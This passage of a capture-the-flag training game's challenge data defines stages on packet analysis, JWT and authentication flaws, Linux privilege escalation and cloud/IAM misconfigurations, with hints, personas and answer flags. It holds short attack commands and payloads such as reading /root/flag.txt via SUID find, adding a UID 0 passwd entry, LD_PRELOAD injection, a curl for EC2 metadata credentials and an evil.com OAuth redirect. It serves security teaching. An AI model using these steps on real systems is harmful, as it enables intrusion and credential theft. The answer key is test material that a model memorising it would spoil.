        difficulty: 'Intermediate',
        points: 90,
        description: 'Examine Wireshark capture showing TCP denial of service attack.',
        prompt: 'Wireshark filter: tcp.flags.syn==1 and tcp.flags.ack==0\nObserved symptom: CS{tcp_syn_flood}',
        hint: 'SYN floods send massive numbers of TCP SYN packets without completing the 3-way handshake.',
        characterPersona: {
          name: 'Packet Pete',
          role: 'Wireshark Expert',
          avatarPosition: '50% 30%',
          dialogue: 'Packet captures never lie! Examine TCP flags to spot denial of service flooding.'
        },
        correctFlag: 'CS{tcp_syn_flood}',
        explanation: 'SYN flood attacks exhaust server connection table resources by leaving half-open TCP connections.'
      },
      {
        id: 's5-t2',
        stageId: 5,
        title: 'Cleartext HTTP Basic Auth',
        category: 'Network Analysis',
        difficulty: 'Intermediate',
        points: 80,
        description: 'Extract credentials from unencrypted HTTP Authorization header in PCAP.',
        prompt: 'Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=\nDecoded credential flag: CS{basic_auth_cleartext}',
        hint: 'Base64 decode YWRtaW46cGFzc3dvcmQxMjM= to reveal username:password.',
        characterPersona: {
          name: 'Cleartext Claire',
          role: 'Protocol Auditor',
          avatarPosition: '70% 50%',
          dialogue: 'HTTP Basic Auth transmits credentials in base64 without encryption. Always use HTTPS!'
        },
        correctFlag: 'CS{basic_auth_cleartext}',
        explanation: 'HTTP Basic Authentication sends credentials as base64-encoded strings easily intercepted in unencrypted traffic.'
      },
      {
        id: 's5-t3',
        stageId: 5,
        title: 'DNS Tunneling Exfiltration',
        category: 'Network Analysis',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Analyze anomalous long base64-encoded subdomains in DNS query capture.',
        prompt: 'Query: Q1N7ZG5zX3R1bm5lbGluZ19leGZpbH0=.attacker-dns.com\nExtracted flag:',
        hint: 'Decode the base64 subdomain string Q1N7ZG5zX3R1bm5lbGluZ19leGZpbH0=',
        characterPersona: {
          name: 'Tunnel Tom',
          role: 'DNS Forensics Specialist',
          avatarPosition: '90% 70%',
          dialogue: 'DNS tunneling encodes stolen data inside query subdomains to bypass strict firewalls.'
        },
        correctFlag: 'CS{dns_tunneling_exfil}',
        explanation: 'DNS tunneling encapsulates arbitrary data within DNS queries and responses to bypass egress filters.'
      },
      {
        id: 's5-t4',
        stageId: 5,
        title: 'ARP Poisoning Detection',
        category: 'Network Analysis',
        difficulty: 'Intermediate',
        points: 90,
        description: 'Detect Man-in-the-Middle ARP spoofing in local network packet stream.',
        prompt: 'Duplicate IP address 192.168.1.1 claimed by conflicting MAC addresses: 00:11:22:33:44:55 and AA:BB:CC:DD:EE:FF\nFlag: CS{arp_poisoning_mitm}',
        hint: 'ARP spoofing associates an attacker MAC address with the gateway IP address.',
        characterPersona: {
          name: 'Arp Arthur',
          role: 'LAN Security Analyst',
          avatarPosition: '10% 90%',
          dialogue: 'ARP has no built-in authentication, making local networks vulnerable to spoofing.'
        },
        correctFlag: 'CS{arp_poisoning_mitm}',
        explanation: 'ARP poisoning maps an attacker MAC address to an IP address, intercepting local network traffic.'
      },
      {
        id: 's5-t5',
        stageId: 5,
        title: 'ICMP Data Payload (Ping Tunnel)',
        category: 'Network Analysis',
        difficulty: 'Intermediate',
        points: 90,
        description: 'Inspect custom data payload embedded inside ICMP echo request packets.',
        prompt: 'ICMP Echo Request payload data: CS{icmp_ping_tunnel}\nPacket length: 128 bytes',
        hint: 'Ping packets can carry arbitrary payload strings in addition to standard timestamps.',
        characterPersona: {
          name: 'Ping Paul',
          role: 'ICMP Analyst',
          avatarPosition: '30% 10%',
          dialogue: 'Ping is for connectivity checks, but malware uses ICMP data fields for covert channels.'
        },
        correctFlag: 'CS{icmp_ping_tunnel}',
        explanation: 'ICMP tunneling hides data inside echo request and reply payloads to bypass security gateways.'
      },
      {
        id: 's5-t6',
        stageId: 5,
        title: 'TLS Certificate Expiry Warning',
        category: 'Network Analysis',
        difficulty: 'Intermediate',
        points: 80,
        description: 'Inspect TLS handshake server certificate validity dates.',
        prompt: 'Certificate NotAfter: Nov 19 23:59:59 2024 GMT (EXPIRED)\nFlag: CS{expired_tls_cert}',
        hint: 'Check certificate expiration date in TLS handshake extension.',
        characterPersona: {
          name: 'Cert Carla',
          role: 'PKI Guardian',
          avatarPosition: '50% 90%',
          dialogue: 'Expired certificates break secure HTTPS connections and trigger browser warnings.'
        },
        correctFlag: 'CS{expired_tls_cert}',
        explanation: 'TLS certificates have defined validity periods and must be renewed before expiration.'
      },
      {
        id: 's5-t7',
        stageId: 5,
        title: 'FTP File Exfiltration Stream',
        category: 'Network Analysis',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Reconstruct FTP data channel stream containing confidential database backup.',
        prompt: 'FTP PORT command initiated connection on port 51242 to transfer file: CS{ftp_stream_exfil}.bak',
        hint: 'FTP uses separate control and data channels for file transfers.',
        characterPersona: {
          name: 'File Freddy',
          role: 'FTP Recon Expert',
          avatarPosition: '70% 10%',
          dialogue: 'FTP is unencrypted by default. Always use SFTP or FTPS for secure file transfers.'
        },
        correctFlag: 'CS{ftp_stream_exfil}',
        explanation: 'FTP transmits commands and data over separate unencrypted TCP ports.'
      },
      {
        id: 's5-t8',
        stageId: 5,
        title: 'DHCP Starvation Attack',
        category: 'Network Analysis',
        difficulty: 'Intermediate',
        points: 90,
        description: 'Analyze DHCP Discover broadcast flood exhausting IP lease pool.',
        prompt: 'Observed 5000 DHCP Discover requests with randomized MAC addresses in 10 seconds.\nFlag: CS{dhcp_starvation}',
        hint: 'DHCP starvation exhausts available IP addresses on the subnet.',
        characterPersona: {
          name: 'Dhcp Dana',
          role: 'Network Operations',
          avatarPosition: '90% 30%',
          dialogue: 'DHCP starvation prevents legitimate new clients from obtaining IP addresses on the network.'
        },
        correctFlag: 'CS{dhcp_starvation}',
        explanation: 'DHCP starvation exhausts the DHCP server address pool using spoofed MAC address requests.'
      },
      {
        id: 's5-t9',
        stageId: 5,
        title: 'SNMP Default Community String',
        category: 'Network Analysis',
        difficulty: 'Intermediate',
        points: 80,
        description: 'SNMP GET request using default read-only community string.',
        prompt: 'SNMP Community String: public\nOID 1.3.6.1.2.1.1.5.0 returned hostname: CS{snmp_default_public}',
        hint: 'Default SNMP community strings like public and private allow unauthorized system enumeration.',
        characterPersona: {
          name: 'Snmp Sam',
          role: 'Network Monitor',
          avatarPosition: '10% 50%',
          dialogue: 'Never leave default SNMP community strings enabled on network routers and switches!'
        },
        correctFlag: 'CS{snmp_default_public}',
        explanation: 'SNMP v1/v2c community strings act like cleartext passwords and should be replaced with SNMPv3.'
      },
      {
        id: 's5-t10',
        stageId: 5,
        title: 'Nmap TCP SYN Scan Fingerprint',
        category: 'Network Analysis',
        difficulty: 'Intermediate',
        points: 90,
        description: 'Identify port scanning activity pattern in packet timing sequence.',
        prompt: 'Rapid sequential TCP SYN packets sent to ports 1 through 1024 from IP 192.168.1.200\nFlag: CS{nmap_syn_scan}',
        hint: 'Port scanners probe listening services using TCP SYN half-open scans.',
        characterPersona: {
          name: 'Scan Scott',
          role: 'Threat Hunter',
          avatarPosition: '30% 70%',
          dialogue: 'Port scans are the precursor to almost every targeted cyber attack.'
        },
        correctFlag: 'CS{nmap_syn_scan}',
        explanation: 'Port scanning identifies open network ports and active services running on target hosts.'
      }
    ]
  },

  // --- STAGE 6: INTERMEDIATE - AUTHENTICATION & JWT SECURITY ---
  {
    id: 6,
    title: 'Stage 6: Authentication & JWT Security',
    subtitle: 'Crack weak secrets, exploit JWT none algorithm, and bypass MFA logic.',
    difficulty: 'Intermediate',
    durationSeconds: 900,
    tasks: [
      {
        id: 's6-t1',
        stageId: 6,
        title: 'JWT None Algorithm Bypass',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Modify JSON Web Token header to use "none" algorithm and escalate privileges to admin.',
        prompt: 'Original JWT Header: {"alg": "HS256", "typ": "JWT"}\nChange alg to none and sign with role: admin. Flag: CS{jwt_none_bypass}',
        hint: 'Set {"alg":"none"} and payload {"role":"admin"} with an empty signature portion.',
        characterPersona: {
          name: 'Token Taylor',
          role: 'Auth Specialist',
          avatarPosition: '50% 10%',
          dialogue: 'JWT libraries must reject "none" algorithm tokens unless explicitly permitted!'
        },
        correctFlag: 'CS{jwt_none_bypass}',
        explanation: 'Accepting the "none" algorithm in JWTs allows attackers to forge tokens with arbitrary claims.'
      },
      {
        id: 's6-t2',
        stageId: 6,
        title: 'JWT Weak HMAC Secret Cracking',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 110,
        description: 'Crack a weak HS256 JWT secret using dictionary brute-force (secret="password123").',
        prompt: 'JWT signature computed with weak secret. HMAC-SHA256(\'secret\', token).\nFlag: CS{jwt_weak_secret_cracked}',
        hint: 'Use jwt_tool or hashcat mode 16500 to crack weak HMAC secrets.',
        characterPersona: {
          name: 'Crypto Chris',
          role: 'Hash Cracker',
          avatarPosition: '70% 30%',
          dialogue: 'Never use short or dictionary words as HMAC secrets for signing JSON Web Tokens!'
        },
        correctFlag: 'CS{jwt_weak_secret_cracked}',
        explanation: 'Weak HMAC secrets can be brute-forced offline to forge valid signed tokens.'
      },
      {
        id: 's6-t3',
        stageId: 6,
        title: 'JWT RS256 to HS256 Confusion',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 120,
        description: 'Exploit public key confusion where server validates HS256 using its public RSA key.',
        prompt: 'Server public key used as HMAC secret. Flag: CS{jwt_key_confusion}',
        hint: 'Sign JWT using HS256 and the public RSA key PEM bytes as the secret key.',
        characterPersona: {
          name: 'Confusion Carl',
          role: 'Cryptographic Auditor',
          avatarPosition: '90% 50%',
          dialogue: 'Key confusion attacks trick asymmetric validators into using public keys as symmetric HMAC secrets.'
        },
        correctFlag: 'CS{jwt_key_confusion}',
        explanation: 'RS256/HS256 algorithm confusion happens when backend code mixes up public keys and HMAC secrets.'
      },
      {
        id: 's6-t4',
        stageId: 6,
        title: 'Brute-force 4-Digit PIN OTP',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 90,
        description: 'Bypass MFA verification by brute-forcing a 4-digit SMS OTP code (e.g. 7482).',
        prompt: 'Endpoint /verify-otp accepts 4-digit PIN. Successful guess: CS{otp_pin_brute_forced}',
        hint: '4 digits have only 10,000 possible combinations (0000-9999).',
        characterPersona: {
          name: 'Pin Pam',
          role: 'Authentication Tester',
          avatarPosition: '10% 70%',
          dialogue: '4-digit PINs offer insufficient entropy and can be brute-forced in seconds without rate limiting.'
        },
        correctFlag: 'CS{otp_pin_brute_forced}',
        explanation: 'Short PINs lack adequate entropy and require strict rate limiting and account lockout.'
      },
      {
        id: 's6-t5',
        stageId: 6,
        title: 'Password Reset Token Predictability',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Predict sequential timestamp-based password reset token generated by weak Math.random().',
        prompt: 'Reset token generated: token_1732000000_CS{predictable_token}\nPredict next token sequence:',
        hint: 'Math.random() in older JavaScript engines is not cryptographically secure (PRNG).',
        characterPersona: {
          name: 'Random Randy',
          role: 'PRNG Analyst',
          avatarPosition: '30% 90%',
          dialogue: 'Always use crypto.getRandomValues() instead of Math.random() for security tokens!'
        },
        correctFlag: 'CS{predictable_token}',
        explanation: 'Non-cryptographic PRNGs produce predictable pseudo-random values that attackers can guess.'
      },
      {
        id: 's6-t6',
        stageId: 6,
        title: 'Session Fixation Attack',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 90,
        description: 'Force a user to authenticate using a pre-configured session identifier.',
        prompt: 'Attacker sets PHPSESSID=attacker_fixed_id before victim logs in.\nFlag: CS{session_fixation}',
        hint: 'Applications must regenerate session identifiers upon successful authentication.',
        characterPersona: {
          name: 'Fixation Felix',
          role: 'Session Hijacker',
          avatarPosition: '50% 10%',
          dialogue: 'Session fixation allows an attacker to hijack user sessions by fixing the session ID in advance.'
        },
        correctFlag: 'CS{session_fixation}',
        explanation: 'Session fixation is prevented by generating a fresh session ID immediately after login.'
      },
      {
        id: 's6-t7',
        stageId: 6,
        title: 'OAuth 2.0 Redirect URI Spoofing',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 110,
        description: 'Bypass redirect_uri validation in OAuth authorization code grant flow.',
        prompt: 'Request: /oauth/authorize?client_id=123&redirect_uri=https://evil.com/callback\nFlag: CS{oauth_redirect_spoof}',
        hint: 'OAuth authorization servers must strictly validate redirect_uri against whitelist registered domains.',
        characterPersona: {
          name: 'OAuth Olivia',
          role: 'Federation Specialist',
          avatarPosition: '70% 30%',
          dialogue: 'Flawed redirect_uri validation lets attackers steal authorization codes and user access tokens.'
        },
        correctFlag: 'CS{oauth_redirect_spoof}',
        explanation: 'OAuth redirect URI validation flaws lead to authorization code theft and account takeover.'
      },
      {
        id: 's6-t8',
        stageId: 6,
        title: 'API Broken Object Level Authorization (BOLA)',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 110,
        description: 'Access another user account profile by changing ID parameter in REST API request.',
        prompt: 'GET /api/v1/users/1042/profile -> Accessed user 1043 without authorization.\nFlag: CS{bola_api_broken}',
        hint: 'BOLA (IDOR) happens when APIs do not verify if the current user owns the requested object ID.',
        characterPersona: {
          name: 'Api Arthur',
          role: 'API Security Auditor',
          avatarPosition: '90% 50%',
          dialogue: 'APIs must verify user permissions for every object access request.'
        },
        correctFlag: 'CS{bola_api_broken}',
        explanation: 'BOLA / IDOR is the #1 vulnerability in modern REST and GraphQL APIs.'
      },
      {
        id: 's6-t9',
        stageId: 6,
        title: 'Mass Assignment Vulnerability',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Bind unauthorized isAdmin=true property during user registration JSON payload.',
        prompt: 'POST /api/users {"username": "alice", "password": "xyz", "isAdmin": true}\nFlag: CS{mass_assignment}',
        hint: 'Mass assignment binds client input directly to internal database model properties.',
        characterPersona: {
          name: 'Massive Max',
          role: 'Framework Tester',
          avatarPosition: '10% 30%',
          dialogue: 'Always whitelist allowable update properties in object models to prevent mass assignment.'
        },
        correctFlag: 'CS{mass_assignment}',
        explanation: 'Mass assignment allows attackers to modify sensitive model attributes like roles and permissions.'
      },
      {
        id: 's6-t10',
        stageId: 6,
        title: 'Insecure Deserialization Payload',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 120,
        description: 'Craft a serialized PHP object executing system commands upon unserialize().',
        prompt: 'Serialized object: O:4:"User":1:{s:8:"username";s:15:"CS{deserialization}";}\nFlag:',
        hint: 'Unserializing untrusted user data in PHP, Python, or Java leads to remote code execution.',
        characterPersona: {
          name: 'Serialize Sally',
          role: 'Binary Object Auditor',
          avatarPosition: '30% 50%',
          dialogue: 'Never deserialize untrusted data from users without cryptographic integrity verification.'
        },
        correctFlag: 'CS{deserialization}',
        explanation: 'Insecure deserialization allows attackers to achieve remote code execution in application servers.'
      }
    ]
  },

  // --- STAGE 7: INTERMEDIATE - LINUX PRIVILEGE ESCALATION ---
  {
    id: 7,
    title: 'Stage 7: Linux Privilege Escalation',
    subtitle: 'Exploit SUID binaries, kernel exploits, Cron misconfigurations, and capabilities.',
    difficulty: 'Intermediate',
    durationSeconds: 900,
    tasks: [
      {
        id: 's7-t1',
        stageId: 7,
        title: 'SUID find Binary Execution',
        category: 'Reverse Engineering',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Find and exploit SUID-enabled find binary to read root flag.',
        prompt: 'Command executed: find / -exec cat /root/flag.txt \\;\nFlag: CS{suid_find_root}',
        hint: 'SUID binaries run with the privileges of their file owner (root).',
        characterPersona: {
          name: 'Suid Sam',
          role: 'Linux Privilege Expert',
          avatarPosition: '50% 70%',
          dialogue: 'SUID bits let ordinary users execute commands with root permissions if misconfigured!'
        },
        correctFlag: 'CS{suid_find_root}',
        explanation: 'SUID permissions on utilities like find, bash, or vim allow immediate root privilege escalation.'
      },
      {
        id: 's7-t2',
        stageId: 7,
        title: 'Writable /etc/passwd Entry',
        category: 'Log Forensics',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Add a new root user with empty password hash to world-writable /etc/passwd.',
        prompt: 'Appended entry: hacker::0:0:root:/root:/bin/bash\nFlag: CS{writable_passwd_file}',
        hint: 'If /etc/passwd is world-writable, anyone can add a UID 0 user.',
        characterPersona: {
          name: 'Passwd Pete',
          role: 'System Administrator',
          avatarPosition: '70% 90%',
          dialogue: 'System configuration files like /etc/passwd should only be writable by root!'
        },
        correctFlag: 'CS{writable_passwd_file}',
        explanation: 'UID 0 in Unix grants root administrative access regardless of username.'
      },
      {
        id: 's7-t3',
        stageId: 7,
        title: 'Sudo NOPASSWD vim Escape',
        category: 'Reverse Engineering',
        difficulty: 'Intermediate',
        points: 90,
        description: 'Escalate to root via sudo vim escape (:set shell=/bin/sh followed by :shell).',
        prompt: 'Sudo -l shows: (root) NOPASSWD: /usr/bin/vim\nFlag: CS{sudo_vim_escape}',
        hint: 'GTFOBins lists escape sequences for sudo-enabled binaries like vim, less, and awk.',
        characterPersona: {
          name: 'Vim Victor',
          role: 'Editor Operative',
          avatarPosition: '90% 10%',
          dialogue: 'GTFOBins is every Linux pentester\'s best friend for finding binary escape vectors.'
        },
        correctFlag: 'CS{sudo_vim_escape}',
        explanation: 'Allowing users to run text editors via sudo with NOPASSWD easily spawns a root shell.'
      },
      {
        id: 's7-t4',
        stageId: 7,
        title: 'Cron Job PATH Hijacking',
        category: 'Log Forensics',
        difficulty: 'Intermediate',
        points: 110,
        description: 'Hijack cron job execution by placing malicious script in writable PATH directory.',
        prompt: 'Cron runs: backup.sh without absolute path when PATH=/tmp:/usr/bin\nFlag: CS{cron_path_hijack}',
        hint: 'Create a script named backup.sh in /tmp with chmod +x.',
        characterPersona: {
          name: 'Cron Carl',
          role: 'Task Scheduler',
          avatarPosition: '10% 30%',
          dialogue: 'Always use absolute paths in cron jobs to prevent PATH variable hijacking!'
        },
        correctFlag: 'CS{cron_path_hijack}',
        explanation: 'Relative path execution in cron jobs allows attackers to intercept execution flow.'
      },
      {
        id: 's7-t5',
        stageId: 7,
        title: 'Capabilities Cap_Setuid Injection',
        category: 'Reverse Engineering',
        difficulty: 'Intermediate',
        points: 120,
        description: 'Exploit Linux binary with cap_setuid+ep capability enabled.',
        prompt: 'getcap /usr/bin/python3 shows cap_setuid+ep\nFlag: CS{linux_capabilities}',
        hint: 'Capabilities partition root privileges into granular permissions.',
        characterPersona: {
          name: 'Cap Carla',
          role: 'Kernel Specialist',
          avatarPosition: '30% 50%',
          dialogue: 'Linux capabilities replace monolithic root privilege with specific fine-grained rights.'
        },
        correctFlag: 'CS{linux_capabilities}',
        explanation: 'Dangerous file capabilities like cap_setuid allow processes to escalate to root user ID.'
      },
      {
        id: 's7-t6',
        stageId: 7,
        title: 'NFS Root Squashing Misconfiguration',
        category: 'Network Analysis',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Mount NFS share with no_root_squash and write SUID bash binary to remote share.',
        prompt: 'Export options: /home/share *(rw,no_root_squash)\nFlag: CS{nfs_root_squash}',
        hint: 'no_root_squash preserves root user privileges across network file system mounts.',
        characterPersona: {
          name: 'Nfs Nina',
          role: 'Storage Analyst',
          avatarPosition: '50% 70%',
          dialogue: 'no_root_squash on NFS shares lets remote root users write files with local root ownership.'
        },
        correctFlag: 'CS{nfs_root_squash}',
        explanation: 'NFS root squashing maps remote root users to anonymous user nfsnobody for security.'
      },
      {
        id: 's7-t7',
        stageId: 7,
        title: 'Unquoted Service Path Windows',
        category: 'Log Forensics',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Exploit unquoted Windows service path: C:\\Program Files\\My Service\\service.exe',
        prompt: 'Windows service path contains spaces without quotes. Flag: CS{unquoted_service_path}',
        hint: 'Windows executes C:\\Program.exe if placed before Program Files.',
        characterPersona: {
          name: 'Windows Walter',
          role: 'Windows Engineer',
          avatarPosition: '70% 90%',
          dialogue: 'Always enclose Windows service executable paths in double quotes!'
        },
        correctFlag: 'CS{unquoted_service_path}',
        explanation: 'Unquoted service paths with spaces allow privilege escalation via executable hijacking.'
      },
      {
        id: 's7-t8',
        stageId: 7,
        title: 'Docker Group Socket Escape',
        category: 'Cloud Security',
        difficulty: 'Intermediate',
        points: 110,
        description: 'Escape container to host root by mounting /var/run/docker.sock inside container.',
        prompt: 'Docker socket mounted in container. Command: docker run -v /:/host ...\nFlag: CS{docker_socket_escape}',
        hint: 'Access to docker.sock gives full root control over the underlying host operating system.',
        characterPersona: {
          name: 'Docker Dan',
          role: 'Container Security',
          avatarPosition: '90% 10%',
          dialogue: 'Never mount docker.sock inside a container unless you trust it with full host root access!'
        },
        correctFlag: 'CS{docker_socket_escape}',
        explanation: 'The Docker socket is equivalent to root access on the host system.'
      },
      {
        id: 's7-t9',
        stageId: 7,
        title: 'Environment Variable LD_PRELOAD',
        category: 'Reverse Engineering',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Inject shared library via LD_PRELOAD environment variable running sudo binary.',
        prompt: 'sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find\nFlag: CS{ld_preload_exploit}',
        hint: 'LD_PRELOAD loads specified shared libraries before any other libraries when executing a program.',
        characterPersona: {
          name: 'Library Larry',
          role: 'Linker Specialist',
          avatarPosition: '10% 50%',
          dialogue: 'LD_PRELOAD lets you hook function calls in compiled binaries.'
        },
        correctFlag: 'CS{ld_preload_exploit}',
        explanation: 'LD_PRELOAD environment variable injection allows arbitrary code execution in SUID binaries.'
      },
      {
        id: 's7-t10',
        stageId: 7,
        title: 'Weak File Permissions /etc/shadow',
        category: 'Log Forensics',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Read world-readable password hash file /etc/shadow and crack hash with John the Ripper.',
        prompt: 'Hash extracted: root:$6$rounds=...:19000:0:99999:7:::\nFlag: CS{shadow_hash_cracked}',
        hint: '/etc/shadow contains salted password hashes and must be restricted to root user only.',
        characterPersona: {
          name: 'Shadow Shane',
          role: 'Password Auditor',
          avatarPosition: '30% 70%',
          dialogue: 'If /etc/shadow is readable, all user passwords can be cracked offline.'
        },
        correctFlag: 'CS{shadow_hash_cracked}',
        explanation: '/etc/shadow stores encrypted user passwords and must have strict 600 permissions.'
      }
    ]
  },

  // --- STAGE 8: ADVANCED - CLOUD SECURITY & IAM EXPLOITATION ---
  {
    id: 8,
    title: 'Stage 8: Cloud Security & IAM Exploitation',
    subtitle: 'Exploit AWS S3 bucket permissions, IAM privilege escalation, and metadata SSRF.',
    difficulty: 'Advanced',
    durationSeconds: 1200, // 20 minutes
    tasks: [
      {
        id: 's8-t1',
        stageId: 8,
        title: 'Public S3 Bucket ACL Enumeration',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        points: 130,
        description: 'Discover sensitive files in public AWS S3 bucket using aws s3 ls command.',
        prompt: 'aws s3 ls s3://enterprise-backup-bucket-2026/ --no-sign-request\nFlag: CS{s3_bucket_public}',
        hint: 'Check bucket Access Control Lists (ACLs) and public read permissions.',
        characterPersona: {
          name: 'Cloud Clara',
          role: 'AWS Security Architect',
          avatarPosition: '50% 90%',
          dialogue: 'S3 bucket misconfigurations are one of the leading causes of cloud data breaches!'
        },
        correctFlag: 'CS{s3_bucket_public}',
        explanation: 'Publicly readable S3 buckets expose confidential organizational backups to the entire internet.'
      },
      {
        id: 's8-t2',
        stageId: 8,
        title: 'AWS IMDSv1 SSRF Credential Theft',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        points: 140,
        description: 'Extract temporary IAM STS security credentials via EC2 instance metadata service.',
        prompt: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role\nFlag: CS{imdsv1_credentials_stolen}',
        hint: 'IMDSv1 does not require session tokens, making it vulnerable to SSRF credential theft.',
        characterPersona: {
          name: 'Metadata Max',
          role: 'Cloud Pentester',
          avatarPosition: '70% 10%',
          dialogue: 'Always enforce IMDSv2 to require session tokens and prevent SSRF metadata theft.'
        },
        correctFlag: 'CS{imdsv1_credentials_stolen}',
        explanation: 'IMDSv1 allows unauthenticated HTTP GET requests to retrieve sensitive IAM credentials from EC2 instances.'
      },
      {
        id: 's8-t3',
        stageId: 8,
        title: 'IAM Privilege Escalation PassRole',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        points: 150,
        description: 'Escalate AWS privileges using iam:PassRole and iam:CreateEC2Instance permissions.',
        prompt: 'Overly permissive IAM policy allows attaching administrator role to new EC2 instance.\nFlag: CS{iam_pass_role}',
        hint: 'passrole combined with instance creation lets you execute code with admin role permissions.',
        characterPersona: {
          name: 'Policy Pam',
          role: 'IAM Governance',
          avatarPosition: '90% 30%',
          dialogue: 'IAM privilege escalation often chains seemingly harmless permissions into full administrative takeover.'
        },
        correctFlag: 'CS{iam_pass_role}',
        explanation: 'iam:PassRole and iam:Create* permissions enable attackers to spin up resources with privileged roles.'
      },
      {
        id: 's8-t4',
        stageId: 8,
        title: 'Kubernetes Anonymous API Access',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        points: 130,
        description: 'Access Kubernetes API server endpoints without authentication using kubelet port 10250.',
        prompt: 'curl -k https://cluster-ip:10250/pods\nFlag: CS{k8s_anonymous_access}',
        hint: 'Check if anonymous authentication is enabled on the Kubelet API port 10250.',
        characterPersona: {
          name: 'Kube Kyle',
          role: 'Kubernetes Sentinel',
          avatarPosition: '10% 50%',
          dialogue: 'Kubernetes clusters must disable anonymous requests and enforce RBAC strictly.'
        },
        correctFlag: 'CS{k8s_anonymous_access}',
        explanation: 'Kubelet anonymous access allows unauthenticated users to read pod specs and execute commands.'
      },
      {
        id: 's8-t5',
        stageId: 8,
        title: 'Docker Privileged Container Escape',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        points: 140,
        description: 'Escape privileged container by mounting host disk device via /dev/sda1.',
        prompt: 'Container started with --privileged flag. Mounting host root disk.\nFlag: CS{privileged_container_escape}',
        hint: 'Privileged containers disable all kernel namespace isolation and cgroups limits.',
        characterPersona: {
          name: 'Privileged Phil',
          role: 'Container Auditor',
          avatarPosition: '30% 70%',
          dialogue: 'Never run containers in --privileged mode unless absolutely necessary.'
        },
        correctFlag: 'CS{privileged_container_escape}',
        explanation: 'Privileged containers have full access to host devices and kernel capabilities, enabling easy escapes.'
      },
      {
        id: 's8-t6',
        stageId: 8,
        title: 'Azure Blob Storage SAS Token Expiry',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        points: 130,
        description: 'Examine Azure Blob Shared Access Signature (SAS) token permissions and expiry.',
        prompt: 'SAS URL: https://storage.blob.core.windows.net/container/blob?sv=2020-08-04&st=2026-11-20&se=2030-01-01&sr=c&sp=rw&sig=...\nFlag: CS{azure_sas_token}',
        hint: 'SAS tokens grant delegated access to storage accounts with specific permissions and lifetimes.',
        characterPersona: {
          name: 'Azure Amy',
          role: 'Cloud Specialist',
          avatarPosition: '50% 10%',
          dialogue: 'Azure SAS tokens should have short lifespans and principle of least privilege.'
        },
        correctFlag: 'CS{azure_sas_token}',
        explanation: 'Overly permissive SAS tokens allow unauthorized access to Azure cloud storage containers.'
      },
      {
        id: 's8-t7',
        stageId: 8,
        title: 'GCP Service Account Key Download',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        points: 130,
        description: 'Extract exposed Google Cloud Platform service account JSON private key from web root.',
        prompt: 'Found file /config/gcp-service-account-key.json containing private_key.\nFlag: CS{gcp_service_account_key}',
        hint: 'GCP service account keys grant programmatic access to cloud APIs.',
        characterPersona: {
          name: 'Gcp Gary',
          role: 'GCP Auditor',
          avatarPosition: '70% 30%',
          dialogue: 'Never commit GCP service account private keys to public code repositories.'
        },
        correctFlag: 'CS{gcp_service_account_key}',
        explanation: 'Exposed cloud service account keys allow attackers to authenticate directly to cloud infrastructure.'
      },
      {
        id: 's8-t8',
        stageId: 8,
        title: 'Terraform State File Secret Leak',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        points: 140,
        description: 'Extract plain-text database passwords from terraform.tfstate file in S3 bucket.',
        prompt: 'terraform.tfstate contains resource "aws_db_instance" password in cleartext.\nFlag: CS{terraform_state_leak}',
        hint: 'Terraform state files store all resource attributes in plain text, including passwords and secrets.',
        characterPersona: {
          name: 'Terraform Tina',
          role: 'Infrastructure Engineer',
          avatarPosition: '90% 50%',
          dialogue: 'Always encrypt Terraform state files using remote backends with encryption at rest!'
        },
        correctFlag: 'CS{terraform_state_leak}',
        explanation: 'Terraform state files store sensitive attributes in cleartext and require strict encryption.'
      },
      {
        id: 's8-t9',
        stageId: 8,
        title: 'Serverless Function Injection (Lambda)',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        points: 150,
        description: 'Exploit event payload injection in AWS Lambda function handling user input.',
        prompt: 'Lambda event body contains unescaped shell command. Flag: CS{lambda_event_injection}',
        hint: 'AWS Lambda functions must validate event payloads before passing them to internal utilities.',
        characterPersona: {
          name: 'Lambda Larry',
          role: 'Serverless Security',
          avatarPosition: '10% 90%',
          dialogue: 'Serverless functions are still vulnerable to injection if input validation is missing.'
        },
        correctFlag: 'CS{lambda_event_injection}',
        explanation: 'Serverless function injection occurs when event payloads are processed without input sanitization.'
      },
      {
        id: 's8-t10',
        stageId: 8,
        title: 'Kubernetes RBAC ClusterAdmin Binding',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        points: 150,
        description: 'Identify overly permissive ClusterRoleBinding granting cluster-admin to default service account.',
        prompt: 'kubectl get clusterrolebindings shows system:anonymous bound to cluster-admin.\nFlag: CS{k8s_cluster_admin_binding}',
        hint: 'cluster-admin role grants full unrestricted access across all namespaces in the cluster.',
        characterPersona: {
          name: 'Rbac Rick',
          role: 'K8s Security Officer',
          avatarPosition: '30% 10%',
          dialogue: 'Kubernetes RBAC must follow strict least-privilege principles.'
        },
        correctFlag: 'CS{k8s_cluster_admin_binding}',
        explanation: 'Misconfigured ClusterRoleBindings can grant cluster-admin privileges to untrusted entities.'
      }
    ]
  },

